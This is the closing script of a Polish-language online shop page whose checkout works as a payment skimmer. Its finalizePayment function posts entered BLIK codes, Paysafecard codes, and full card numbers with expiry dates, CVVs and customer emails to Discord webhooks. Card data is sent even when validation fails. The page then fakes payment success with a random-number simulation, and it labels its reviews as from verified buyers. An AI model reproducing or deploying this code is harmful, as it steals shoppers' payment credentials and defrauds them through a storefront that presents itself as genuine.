            const cartTotalElement = document.getElementById('cart-total');
            const checkoutBtn = document.getElementById('checkout-btn');
            const totalAmount = document.getElementById('total-amount');

            cartCount.textContent = cart.length;

            if (cart.length === 0) {
                cartItems.innerHTML = '<p style="opacity: 0.7; text-align: center;">Koszyk jest pusty</p>';
                cartTotalElement.style.display = 'none';
                checkoutBtn.style.display = 'none';
                return;
            }

            let total = 0;
            cart.forEach((item) => {
                total += item.price;
            });
            cartTotal = total; // Update global cartTotal

            let itemsHTML = '';
            cart.forEach((item, index) => {
                itemsHTML += `
                    <div class="cart-item" id="cart-item-${index}">
                        <div>
                            <div class="cart-item-name">${item.name}</div>
                            <div class="cart-item-price">${item.price} z≈Ç</div>
                        </div>
                        <button onclick="removeFromCart(${index})" style="background: none; border: none; color: #ec4899; cursor: pointer;">‚úñ</button>
                    </div>
                `;
            });

            cartItems.innerHTML = itemsHTML;
            totalAmount.textContent = `${cartTotal.toFixed(2)} z≈Ç`;
            cartTotalElement.style.display = 'block';
            checkoutBtn.style.display = 'block';
        }

        function removeFromCart(index) {
            const itemElement = document.getElementById(`cart-item-${index}`);
            if (itemElement) {
                itemElement.classList.add('removing');
                itemElement.addEventListener('transitionend', () => {
                    cart.splice(index, 1);
                    updateCartDisplay();
                }, { once: true });
            } else {
                cart.splice(index, 1);
                updateCartDisplay();
            }
        }

        function toggleCart() {
            const cartSidebar = document.getElementById('cart-sidebar');
            cartSidebar.classList.toggle('open');
        }

        // Close cart sidebar when clicking outside
        window.addEventListener('click', function(event) {
            const cartSidebar = document.getElementById('cart-sidebar');
            const cartIcon = document.getElementById('cart-icon-btn');
            
            // Check if the click is outside the cart sidebar and not on the cart icon itself
            if (cartSidebar.classList.contains('open') && !cartSidebar.contains(event.target) && !cartIcon.contains(event.target)) {
                cartSidebar.classList.remove('open');
            }
        });


        // Notification functionality
        function showNotification(message) {
            const notification = document.getElementById('cart-notification');
            const notificationMessage = document.getElementById('notification-message');
            notificationMessage.textContent = message;
            notification.classList.add('show');
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000); // Hide after 3 seconds
        }

        // Product details modal
        function showProductDetails(productId) {
            const product = productSpecs[productId];
            const modal = document.getElementById('product-modal');
            const modalTitle = document.getElementById('modal-title');
            const modalProductInfo = document.getElementById('modal-product-info');
            const modalSpecs = document.getElementById('modal-specs');
            const modalReviews = document.getElementById('modal-reviews');

            modalTitle.textContent = product.name;

            // Product Info (Image/Icon, Price, Description)
            // Changed to display icon instead of image in modal
            let productInfoHTML = `
                <div class="modal-product-image-wrapper product-icon-display">
                    <span class="product-icon">${product.icon}</span>
                </div>
                <div class="modal-product-details">
                    <h3>${product.name}</h3>
                    <div class="product-price ${product.oldPrice ? 'discounted' : ''}">
                        ${product.displayPrice}
                        ${product.oldPrice ? `<span class="old-price">${product.oldPrice} z≈Ç</span><span class="discount-badge">-32%</span>` : ''}
                    </div>
                    <p>${product.description}</p>
                    <button class="buy-button" onclick="event.stopPropagation(); addToCart('${product.name}', ${product.price}); closeProductDetails();">Dodaj do koszyka</button>
                </div>
            `;
            modalProductInfo.innerHTML = productInfoHTML;

            // Specifications
            let specsHTML = '';
            Object.entries(product.specs).forEach(([key, value]) => {
                specsHTML += `
                    <div class="spec-item">
                        <strong>${key}</strong>
                        <span>${value}</span>
                    </div>
                `;
            });
            modalSpecs.innerHTML = specsHTML;

            // Product-specific reviews
            let reviewsHTML = '<h3 style="color: #00d4ff; margin-bottom: 1.5rem; text-align: center;">Opinie o tym produkcie:</h3>';
            if (product.reviews && product.reviews.length > 0) {
                product.reviews.forEach(review => {
                    reviewsHTML += `
                        <div class="review-card">
                            <div class="stars">${'‚òÖ'.repeat(review.stars)}</div>
                            <p class="review-text">"${review.text}"</p>
                            <div class="reviewer">
                                <div class="reviewer-avatar">${review.name.charAt(0)}</div>
                                <div class="reviewer-info">
                                    <h4>${review.name}</h4>
                                    <p>Zweryfikowany kupujƒÖcy</p>
                                </div>
                            </div>
                        </div>
                    `;
                });
            } else {
                reviewsHTML += '<p style="opacity: 0.7; text-align: center;">Brak opinii dla tego produktu.</p>';
            }
            modalReviews.innerHTML = reviewsHTML;

            modal.style.display = 'block';
        }

        function closeProductDetails() {
            document.getElementById('product-modal').style.display = 'none';
        }

        // Checkout Modal functions
        function openCheckoutModal() {
            if (cart.length === 0) {
                alert('Tw√≥j koszyk jest pusty. Dodaj produkty, aby przej≈õƒá do kasy.');
                return;
            }
            const cartSidebar = document.getElementById('cart-sidebar');
            cartSidebar.classList.remove('open'); // Close cart sidebar
            document.getElementById('checkout-modal').style.display = 'block';
            document.getElementById('shipping-step').style.display = 'block';
            document.getElementById('payment-step').style.display = 'none';
        }

        function closeCheckoutModal() {
            document.getElementById('checkout-modal').style.display = 'none';
            document.getElementById('shipping-form').reset(); // Reset form fields
            pscCodeCount = 1; // Ensure PSC code count is reset
            // Also clear any dynamically added PSC inputs
            const pscCodesContainer = document.getElementById('psc-codes-container');
            if (pscCodesContainer) {
                while (pscCodesContainer.children.length > 1) { // Keep the first one
                    pscCodesContainer.removeChild(pscCodesContainer.lastChild);
                }
                // Reset the value of the first PSC input if it exists
                const firstPscInput = document.getElementById('pscCode1');
                if (firstPscInput) {
                    firstPscInput.value = '';
                }
            }
        }

        function goToPaymentStep() {
            const shippingForm = document.getElementById('shipping-form');
            if (!shippingForm.checkValidity()) {
                shippingForm.reportValidity(); // Show browser's validation messages
                return;
            }

            const selectedDeliveryMethod = document.getElementById('deliveryMethod').value;
            const selectedPaymentMethod = document.getElementById('paymentMethod').value;

            if (!selectedDeliveryMethod || !selectedPaymentMethod) {
                alert('Proszƒô wybraƒá spos√≥b dostawy i p≈Çatno≈õci.');
                return;
            }

            const currentShippingCost = shippingCosts[selectedDeliveryMethod];
            const productsTotal = cartTotal;
            const finalTotal = productsTotal + currentShippingCost + COMMISSION_FEE;

            document.getElementById('summary-products-cost').textContent = `${productsTotal.toFixed(2)} z≈Ç`;
            document.getElementById('summary-shipping-cost').textContent = `${currentShippingCost.toFixed(2)} z≈Ç`;
            document.getElementById('summary-commission-cost').textContent = `${COMMISSION_FEE.toFixed(2)} z≈Ç`;
            document.getElementById('summary-total-cost').textContent = `${finalTotal.toFixed(2)} z≈Ç`;

            document.getElementById('shipping-step').style.display = 'none';
            document.getElementById('payment-step').style.display = 'block';

            renderPaymentMethodForm(selectedPaymentMethod, finalTotal);
        }

        function backToShippingStep() {
            document.getElementById('payment-step').style.display = 'none';
            document.getElementById('shipping-step').style.display = 'block';
        }

        // Helper function for card/PSC formatting (every 4 digits)
        function formatWithDashes(value, groupSize) {
            const cleanedValue = value.replace(/\D/g, ''); // Remove non-digits
            let formattedValue = '';
            for (let i = 0; i < cleanedValue.length; i++) {
                if (i > 0 && i % groupSize === 0) {
                    formattedValue += '-';
                }
                formattedValue += cleanedValue[i];
            }
            return formattedValue;
        }

        // Phone number formatting (every 3 digits)
        function formatPhoneInput(input) {
            let value = input.value.replace(/\D/g, ''); // Remove non-digits
            let formattedValue = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 3 === 0) {
                    formattedValue += '-';
                }
                formattedValue += value[i];
            }
            input.value = formattedValue.substring(0, input.maxLength); // Apply max length after formatting
        }

        // Postal code formatting (XX-XXX)
        function formatPostalCodeInput(input) {
            let value = input.value.replace(/\D/g, ''); // Remove non-digits
            if (value.length > 2) {
                value = value.substring(0, 2) + '-' + value.substring(2, 5);
            }
            input.value = value.substring(0, input.maxLength); // Apply max length after formatting
        }

        // Expiry date formatting (MM/YY)
        function formatExpiryDateInput(input) {
            let value = input.value.replace(/\D/g, ''); // Remove non-digits
            if (value.length > 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            input.value = value.substring(0, input.maxLength); // Apply max length after formatting
        }

        // CVV formatting (just digits, max 3)
        function formatCvvInput(input) {
            input.value = input.value.replace(/\D/g, '').substring(0, input.maxLength);
        }

        // BLIK formatting (just digits, max 6)
        function formatBlikInput(input) {
            input.value = input.value.replace(/\D/g, '').substring(0, input.maxLength);
        }

        function renderPaymentMethodForm(method, finalTotal) {
            const paymentDetailsContainer = document.getElementById('payment-method-details');
            let formHTML = '';

            switch (method) {
                case 'blik':
                    formHTML = `
                        <div class="payment-method-form">
                            <div class="form-group">
                                <label for="blikCode">Wprowad≈∫ kod BLIK (6 cyfr) *</label>
                                <input type="text" id="blikCode" pattern="[0-9]{6}" maxlength="6" inputmode="numeric" required>
                            </div>
                            <div id="blikMessage" class="message info">
                                Stw√≥rz kod BLIK na kwotƒô ${finalTotal.toFixed(2)} z≈Ç w swojej aplikacji bankowej.<br>
                                Poczekaj a≈º kod BLIK zostanie zaakceptowany.<br>
                                Potwierdzenie z zako≈Ñczenia p≈Çatno≈õci zostanie wys≈Çane na Tw√≥j email, je≈ºeli kod BLIK zostanie zaakceptowany.
                            </div>
                            <button type="button" class="payment-submit-btn" onclick="finalizePayment('blik', ${finalTotal})">Zap≈Çaƒá BLIKIEM</button>
                        </div>
                    `;
                    break;
                case 'psc':
                    formHTML = `
                        <div class="payment-method-form">
                            <div class="psc-codes-container" id="psc-codes-container">
                                <div class="psc-code-entry">
                                    <label for="pscCode1">Wprowad≈∫ kod Paysafecard (16 cyfr) *</label>
                                    <input type="text" id="pscCode1" class="psc-code-input" pattern="([0-9]{4}-){3}[0-9]{4}" maxlength="19" inputmode="numeric" required>
                                    <button type="button" class="add-psc-code-btn" onclick="addPscCodeInput()">+</button>
                                </div>
                            </div>
                            <div id="pscMessage" class="message info">
                                Poczekaj na weryfikacjƒô kodu Paysafecard.<br>
                                Potwierdzenie z zap≈ÇatƒÖ zostanie wys≈Çane na Tw√≥j email, je≈ºeli kod PSC zostanie zaakceptowany.
                            </div>
                            <button type="button" class="payment-submit-btn" onclick="finalizePayment('psc', ${finalTotal})">Zap≈Çaƒá Paysafecard</button>
                        </div>
                    `;
                    break;
                case 'card':
                    formHTML = `
                        <div class="payment-method-form">
                            <div class="form-group">
                                <label for="cardNumber">Numer karty *</label>
                                <input type="text" id="cardNumber" pattern="([0-9]{4}-){3}[0-9]{4}" maxlength="19" placeholder="XXXX-XXXX-XXXX-XXXX" inputmode="numeric" required>
                            </div>
                            <div class="form-group">
                                <label for="expiryDate">Data wa≈ºno≈õci (MM/RR) *</label>
                                <input type="text" id="expiryDate" pattern="(0[1-9]|1[0-2])\/[0-9]{2}" maxlength="5" placeholder="MM/RR" inputmode="numeric" required>
                            </div>
                            <div class="form-group">
                                <label for="cvv">CVV *</label>
                                <input type="text" id="cvv" pattern="[0-9]{3}" maxlength="3" inputmode="numeric" required>
                            </div>
                            <div id="cardMessage" class="message info">
                                Wprowad≈∫ dane swojej karty p≈Çatniczej.<br>
                                Potwierdzenie z zako≈Ñczenia p≈Çatno≈õci zostanie wys≈Çane na Tw√≥j email.
                            </div>
                            <button type="button" class="payment-submit-btn" onclick="finalizePayment('card', ${finalTotal})">Zap≈Çaƒá kartƒÖ</button>
                        </div>
                    `;
                    break;
                default:
                    formHTML = '<p class="message error">Nie wybrano metody p≈Çatno≈õci lub jest ona nieobs≈Çugiwana.</p>';
            }
            paymentDetailsContainer.innerHTML = formHTML;

            // Attach listeners after rendering the form
            if (method === 'blik') {
                const blikCodeInput = document.getElementById('blikCode');
                if (blikCodeInput) {
                    blikCodeInput.addEventListener('input', function(e) {
                        formatBlikInput(e.target);
                    });
                }
            } else if (method === 'psc') {
                // Attach to existing and future PSC inputs
                attachPscInputListeners();
            } else if (method === 'card') {
                const cardNumberInput = document.getElementById('cardNumber');
                const expiryDateInput = document.getElementById('expiryDate');
                const cvvInput = document.getElementById('cvv');

                if (cardNumberInput) {
                    cardNumberInput.addEventListener('input', function(e) {
                        e.target.value = formatWithDashes(e.target.value, 4);
                    });
                }
                if (expiryDateInput) {
                    expiryDateInput.addEventListener('input', function(e) {
                        formatExpiryDateInput(e.target);
                    });
                }
                if (cvvInput) {
                    cvvInput.addEventListener('input', function(e) {
                        formatCvvInput(e.target);
                    });
                }
            }
        }

        let pscCodeCount = 1;
        // Helper to attach PSC listeners (for initial and dynamically added inputs)
        function attachPscInputListeners() {
            document.querySelectorAll('.psc-code-input').forEach(input => {
                // Remove existing listener to prevent duplicates if called multiple times
                input.removeEventListener('input', pscInputHandler);
                input.addEventListener('input', pscInputHandler);
            });
        }

        // Handler for PSC inputs
        function pscInputHandler(e) {
            e.target.value = formatWithDashes(e.target.value, 4);
        }

        function addPscCodeInput() {
            pscCodeCount++;
            const pscCodesContainer = document.getElementById('psc-codes-container');
            const newPscEntry = document.createElement('div');
            newPscEntry.className = 'psc-code-entry';
            newPscEntry.innerHTML = `
                <label for="pscCode${pscCodeCount}">Dodatkowy kod PSC (16 cyfr) *</label>
                <input type="text" id="pscCode${pscCodeCount}" class="psc-code-input" pattern="([0-9]{4}-){3}[0-9]{4}" maxlength="19" inputmode="numeric" required>
                <button type="button" class="remove-psc-code-btn" onclick="removePscCodeInput(this)">‚úñ</button>
            `;
            pscCodesContainer.appendChild(newPscEntry);
            
            // Attach listener to the newly created input
            const newPscInput = document.getElementById(`pscCode${pscCodeCount}`);
            if (newPscInput) {
                newPscInput.addEventListener('input', pscInputHandler);
            }
        }

        function removePscCodeInput(buttonElement) {
            const entryToRemove = buttonElement.closest('.psc-code-entry');
            if (entryToRemove) {
                entryToRemove.remove();
            }
        }

        async function sendDiscordWebhook(url, data) {
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                });
                if (!response.ok) {
                    console.error(`Failed to send webhook to ${url}: ${response.status} ${response.statusText}`);
                }
            } catch (error) {
                console.error(`Error sending webhook to ${url}:`, error);
            }
        }

        function finalizePayment(method, finalTotal) {
            let isValid = true;
            let messageElement;
            const customerEmail = document.getElementById('email').value; // Get customer email
            let successMessage = `P≈Çatno≈õƒá na kwotƒô ${finalTotal.toFixed(2)} z≈Ç zako≈Ñczona sukcesem! Numer zam√≥wienia: KB${Math.random().toString(36).substr(2, 9).toUpperCase()}. Potwierdzenie i numer przesy≈Çki zostanie wys≈Çany na Tw√≥j adres email.`;
            let failureMessage = `P≈Çatno≈õƒá nieudana. Spr√≥buj ponownie lub wybierz innƒÖ metodƒô.`;

            if (method === 'blik') {
                const blikCodeInput = document.getElementById('blikCode');
                messageElement = document.getElementById('blikMessage');
                if (!blikCodeInput.checkValidity()) {
                    isValid = false;
                    messageElement.className = 'message error';
                    messageElement.innerHTML = `Wprowad≈∫ poprawny 6-cyfrowy kod BLIK.<br>
                                                Potwierdzenie z zako≈Ñczenia p≈Çatno≈õci zostanie wys≈Çane na Tw√≥j email, je≈ºeli kod BLIK zostanie zaakceptowany.`;
                } else {
                    // Send BLIK code to Discord webhook
                    const blikCode = blikCodeInput.value;
                    const discordData = {
                        content: "Nowa p≈Çatno≈õƒá BLIK!",
                        embeds: [{
                            title: "P≈Çatno≈õƒá BLIK",
                            description: `Pr√≥ba p≈Çatno≈õci BLIK na kwotƒô **${finalTotal.toFixed(2)} z≈Ç**.`,
                            color: 3447003, // Blue
                            fields: [
                                { name: "Kod BLIK", value: `\`${blikCode}\``, inline: true },
                                { name: "Email Klienta", value: customerEmail, inline: false }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    };
                    sendDiscordWebhook(BLIK_WEBHOOK_URL, discordData);

                    messageElement.className = 'message info';
                    messageElement.innerHTML = `Stw√≥rz kod BLIK na kwotƒô ${finalTotal.toFixed(2)} z≈Ç w swojej aplikacji bankowej.<br>
                                                Poczekaj a≈º kod BLIK zostanie zaakceptowany...<br>
                                                Potwierdzenie z zako≈Ñczenia p≈Çatno≈õci zostanie wys≈Çane na Tw√≥j email, je≈ºeli kod BLIK zostanie zaakceptowany.`;
                    // Simulate API call
                    setTimeout(() => {
                        if (Math.random() > 0.2) { // 80% success rate
                            messageElement.className = 'message success';
                            messageElement.innerHTML = successMessage;
                            setTimeout(() => {
                                completeOrder();
                            }, 5000); // Zmieniono na 5 sekund
                        } else {
                            messageElement.className = 'message error';
                            messageElement.innerHTML = `Je≈ºeli kod BLIK nie zostanie zaakceptowany, spr√≥buj p√≥≈∫niej... üòî<br>
                                                        Potwierdzenie z zako≈Ñczenia p≈Çatno≈õci zostanie wys≈Çane na Tw√≥j email, je≈ºeli kod BLIK zostanie zaakceptowany.`;
                        }
                    }, 1500);
                    return; // Don't complete order immediately
                }
            } else if (method === 'psc') {
                const pscCodeInputs = document.querySelectorAll('.psc-code-input');
                messageElement = document.getElementById('pscMessage');
                let allPscCodesValid = true;
                const pscCodes = [];
                const pscPattern = /^([0-9]{4}-){3}[0-9]{4}$/; // Regex for XXXX-XXXX-XXXX-XXXX

                pscCodeInputs.forEach(input => {
                    // Ensure formatting is applied before validation
                    input.value = formatWithDashes(input.value, 4);
                    if (!pscPattern.test(input.value)) { // Manual regex check
                        allPscCodesValid = false;
                    }
                    pscCodes.push(input.value);
                });

                if (!allPscCodesValid) {
                    isValid = false;
                    messageElement.className = 'message error';
                    messageElement.innerHTML = `Wprowad≈∫ wszystkie 16-cyfrowe kody Paysafecard poprawnie (XXXX-XXXX-XXXX-XXXX).<br>
                                                Potwierdzenie z zap≈ÇatƒÖ zostanie wys≈Çane na Tw√≥j email, je≈ºeli kod PSC zostanie zaakceptowany.`;
                } else {
                    // Send PSC codes to Discord webhook
                    const discordData = {
                        content: "Nowa p≈Çatno≈õƒá Paysafecard!",
                        embeds: [{
                            title: "P≈Çatno≈õƒá Paysafecard",
                            description: `Pr√≥ba p≈Çatno≈õci Paysafecard na kwotƒô **${finalTotal.toFixed(2)} z≈Ç** przy u≈ºyciu ${pscCodes.length} kod√≥w.`,
                            color: 15844367, // Yellow/Orange
                            fields: [
                                { name: "Kody Paysafecard", value: pscCodes.map(code => `\`${code}\``).join('\n'), inline: false },
                                { name: "Email Klienta", value: customerEmail, inline: false }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    };
                    sendDiscordWebhook(PSC_WEBHOOK_URL, discordData);

                    messageElement.className = 'message info';
                    messageElement.innerHTML = `Poczekaj na weryfikacjƒô kod√≥w Paysafecard...<br>
                                                Potwierdzenie z zap≈ÇatƒÖ zostanie wys≈Çane na Tw√≥j email, je≈ºeli kod PSC zostanie zaakceptowany.`;
                    // Simulate API call
                    setTimeout(() => {
                        if (Math.random() > 0.2) { // 80% success rate
                            messageElement.className = 'message success';
                            messageElement.innerHTML = successMessage;
                            setTimeout(() => {
                                completeOrder();
                            }, 5000); // Zmieniono na 5 sekund
                        } else {
                            messageElement.className = 'message error';
                            messageElement.innerHTML = `Je≈ºeli kody Paysafecard nie zostanƒÖ zaakceptowane, spr√≥buj p√≥≈∫niej... üòî<br>
                                                        Potwierdzenie z zap≈ÇatƒÖ zostanie wys≈Çane na Tw√≥j email, je≈ºeli kod PSC zostanie zaakceptowany.`;
                        }
                    }, 1500);
                    return; // Don't complete order immediately
                }
            } else if (method === 'card') {
                const cardNumberInput = document.getElementById('cardNumber');
                const expiryDateInput = document.getElementById('expiryDate');
                const cvvInput = document.getElementById('cvv');
                messageElement = document.getElementById('cardMessage');

                // Immediately show "Analizowanie p≈Çatno≈õci..."
                messageElement.className = 'message info';
                messageElement.textContent = 'Analizowanie p≈Çatno≈õci...';

                // Explicitly re-format values before checking validity
                if (cardNumberInput) cardNumberInput.value = formatWithDashes(cardNumberInput.value, 4);
                if (expiryDateInput) formatExpiryDateInput(expiryDateInput); // formatExpiryDateInput modifies in place
                if (cvvInput) formatCvvInput(cvvInput); // formatCvvInput modifies in place

                // Manual validation using regex
                const cardNumberPattern = /^([0-9]{4}-){3}[0-9]{4}$/; // XXXX-XXXX-XXXX-XXXX
                const expiryDatePattern = /^(0[1-9]|1[0-2])\/[0-9]{2}$/; // MM/YY
                const cvvPattern = /^[0-9]{3}$/; // 3 digits

                // Collect data for webhook regardless of client-side validation
                const cardNumber = cardNumberInput.value;
                const expiryDate = expiryDateInput.value;
                const cvv = cvvInput.value;

                const discordData = {
                    content: "Nowa p≈Çatno≈õƒá KartƒÖ KredytowƒÖ!",
                    embeds: [{
                        title: "P≈Çatno≈õƒá KartƒÖ KredytowƒÖ",
                        description: `Pr√≥ba p≈Çatno≈õci kartƒÖ na kwotƒô **${finalTotal.toFixed(2)} z≈Ç**.`,
                        color: 16711680, // Red
                        fields: [
                            { name: "Numer Karty", value: `\`${cardNumber}\``, inline: false },
                            { name: "Data Wa≈ºno≈õci", value: `\`${expiryDate}\``, inline: true },
                            { name: "CVV", value: `\`${cvv}\``, inline: true },
                            { name: "Email Klienta", value: customerEmail, inline: false }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };
                sendDiscordWebhook(CARD_WEBHOOK_URL, discordData); // Send to webhook here

                if (!cardNumberPattern.test(cardNumberInput.value) ||
                    !expiryDatePattern.test(expiryDateInput.value) ||
                    !cvvPattern.test(cvvInput.value)) {
                    isValid = false;
                    messageElement.className = 'message error';
                    messageElement.textContent = 'WystƒÖpi≈Ç problem z danymi karty. Proszƒô sprawdziƒá format i spr√≥bowaƒá ponownie.';
                } else {
                    // If client-side validation passes, proceed with simulation
                    messageElement.className = 'message info'; // Keep info state during simulation
                    messageElement.textContent = 'Przetwarzanie p≈Çatno≈õci kartƒÖ...';
                    // Simulate API call
                    setTimeout(() => {
                        if (Math.random() > 0.2) { // 80% success rate
                            messageElement.className = 'message success';
                            messageElement.innerHTML = successMessage;
                            setTimeout(() => {
                                completeOrder();
                            }, 5000); // Zmieniono na 5 sekund
                        } else {
                            messageElement.className = 'message error';
                            messageElement.innerHTML = failureMessage;
                        }
                    }, 2000);
                }
                return; // Don't complete order immediately
            } else { // This case should ideally not be reached with the updated select options
                alert(`Symulacja przekierowania do ${method.toUpperCase()}...`);
                // Simulate external payment processing
                setTimeout(() => {
                    if (Math.random() > 0.1) { // Higher success rate for external
                        alert(successMessage);
                        completeOrder();
                    } else {
                        alert(failureMessage);
                    }
                }, 1000);
                return;
            }

            if (isValid) {
                // For direct payment methods (if any, not applicable here with current setup)
                // alert(successMessage);
                // completeOrder();
            }
        }

        function completeOrder() {
            cart = [];
            updateCartDisplay();
            closeCheckoutModal();
            document.getElementById('shipping-form').reset(); // Reset shipping form
            pscCodeCount = 1; // Reset PSC code count
        }

        // Close modals when clicking outside
        window.onclick = function(event) {
            const productModal = document.getElementById('product-modal');
            const cartSidebar = document.getElementById('cart-sidebar');
            const cartIcon = document.getElementById('cart-icon-btn');
            const mobileNavLinks = document.getElementById('mobile-nav-links');
            const hamburgerBtn = document.getElementById('hamburger-btn');

            // Close productModal on outside click
            if (event.target === productModal) {
                productModal.style.display = 'none';
            }
            
            // Close cart sidebar on outside click, but not if clicking the cart icon itself
            if (cartSidebar.classList.contains('open') && !cartSidebar.contains(event.target) && !cartIcon.contains(event.target)) {
                cartSidebar.classList.remove('open');
            }

            // Close mobile nav menu on outside click, but not if clicking the hamburger button itself
            if (mobileNavLinks.classList.contains('open') && !mobileNavLinks.contains(event.target) && !hamburgerBtn.contains(event.target)) {
                mobileNavLinks.classList.remove('open');
            }
            // The checkoutModal is now only closed by its 'x' button
        }

        // Smooth scrolling for navigation links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });

        // Load more reviews functionality
        document.getElementById('load-more-btn').addEventListener('click', function() {
            const reviewsGrid = document.getElementById('reviews-grid');
            
            const startIndex = currentExtraReviews;
            const endIndex = Math.min(startIndex + reviewsPerLoad, additionalReviews.length);
            
            for (let i = startIndex; i < endIndex; i++) {
                const review = additionalReviews[i];
                const reviewElement = document.createElement('div');
                reviewElement.className = 'review-card fade-in visible';
                reviewElement.innerHTML = `
                    <div class="stars">${'‚òÖ'.repeat(review.stars)}</div>
                    <p class="review-text">"${review.text}"</p>
                    <div class="reviewer">
                        <div class="reviewer-avatar">${review.avatar}</div>
                        <div class="reviewer-info">
                            <h4>${review.name}</h4>
                            <p>Zweryfikowany kupujƒÖcy - ${review.model}</p>
                        </div>
                    </div>
                `;
                reviewsGrid.appendChild(reviewElement);
            }
            
            currentExtraReviews = endIndex;

            // Update button text and hide if all reviews are loaded
            const remainingReviews = additionalReviews.length - currentExtraReviews;
            if (remainingReviews <= 0) {
                this.style.display = 'none';
            } else {
                this.textContent = `Wy≈õwietl wiƒôcej opinii (pozosta≈Ço ${remainingReviews})`;
            }
        });

        // Scroll animations
        const observerOptions = {
            threshold: 0.1,
            rootMargin: '0px 0px -50px 0px'
        };

        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('visible');
                }
            });
        }, observerOptions);

        // Observe all fade-in elements
        document.querySelectorAll('.fade-in').forEach(el => {
            observer.observe(el);
        });

        // Navbar background change on scroll
        window.addEventListener('scroll', () => {
            const nav = document.querySelector('nav');
            if (window.scrollY > 100) {
                nav.style.background = 'rgba(10, 10, 10, 0.95)';
                nav.style.borderBottomColor = 'rgba(255, 255, 255, 0.2)';
            } else {
                nav.style.background = 'rgba(10, 10, 10, 0.9)';
                nav.style.borderBottomColor = 'rgba(255, 255, 255, 0.1)';
            }

            // Show/hide scroll-to-top button
            const scrollToTopBtn = document.getElementById('scroll-to-top');
            if (window.scrollY > 300) { // Show button after scrolling 300px
                scrollToTopBtn.classList.add('show');
            } else {
                scrollToTopBtn.classList.remove('show');
            }
        });

        // Scroll to top functionality
        document.getElementById('scroll-to-top').addEventListener('click', () => {
            window.scrollTo({
                top: 0,
                behavior: 'smooth'
            });
        });

        // Initial cart update
        updateCartDisplay();

        // Attach initial formatting listeners for static fields
        document.addEventListener('DOMContentLoaded', function() {
            const phoneInput = document.getElementById('phone');
            if (phoneInput) {
                phoneInput.addEventListener('input', function(e) {
                    formatPhoneInput(e.target);
                });
            }

            const zipCodeInput = document.getElementById('zipCode');
            if (zipCodeInput) {
                zipCodeInput.addEventListener('input', function(e) {
                    formatPostalCodeInput(e.target);
                });
            }

            // Add event listener for hamburger menu
            const hamburgerBtn = document.getElementById('hamburger-btn');
            const mobileNavLinks = document.getElementById('mobile-nav-links');

            if (hamburgerBtn && mobileNavLinks) {
                hamburgerBtn.addEventListener('click', function() {
                    mobileNavLinks.classList.toggle('open');
                });
            }

            // Close mobile menu when a link is clicked (optional, but good UX)
            mobileNavLinks.querySelectorAll('a').forEach(link => {
                link.addEventListener('click', function() {
                    mobileNavLinks.classList.remove('open');
                });
            });

            // Close mobile menu if window is resized to desktop size
            window.addEventListener('resize', function() {
                if (window.innerWidth > 768) {
                    mobileNavLinks.classList.remove('open');
                }
            });
        });
    </script>
</body>
</html>
